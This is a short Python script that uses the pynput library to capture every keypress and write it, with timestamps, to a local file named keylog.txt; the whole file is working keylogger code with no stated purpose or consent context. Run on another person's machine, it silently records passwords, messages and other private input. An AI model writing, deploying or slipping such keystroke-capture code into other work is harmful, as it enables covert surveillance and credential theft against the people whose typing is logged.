from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def onPress(key):
    logging.info(str(key))
 
def startListener():
    with Listener(on_press=onPress) as listener :
        listener.join() 